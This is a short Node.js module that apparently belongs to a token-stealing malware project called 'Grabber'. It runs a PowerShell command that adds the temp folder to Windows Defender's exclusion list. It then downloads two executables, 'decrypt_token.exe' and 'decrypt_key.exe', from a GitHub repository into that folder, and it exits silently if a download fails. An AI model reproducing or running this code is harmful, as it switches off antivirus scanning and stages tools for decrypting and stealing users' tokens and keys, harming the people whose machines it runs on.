const axios = require('axios');
const { tempFolder } = require('../index');
const { createWriteStream } = require('fs');
const { join } = require('path');
const { sleep } = require('../util/general');
const { execSync } = require('child_process');

async function download(url) {
  try {
    const { data } = await axios.get(url, {
      responseType: 'stream'
    });
    data.pipe(createWriteStream(join(tempFolder, url.split('/').pop())));
  } catch (e) {
    process.exit(0);
  }
}

module.exports = async () => {
  await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-token/decrypt_token.exe');
  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-key/decrypt_key.exe');
  await sleep(1500);
};
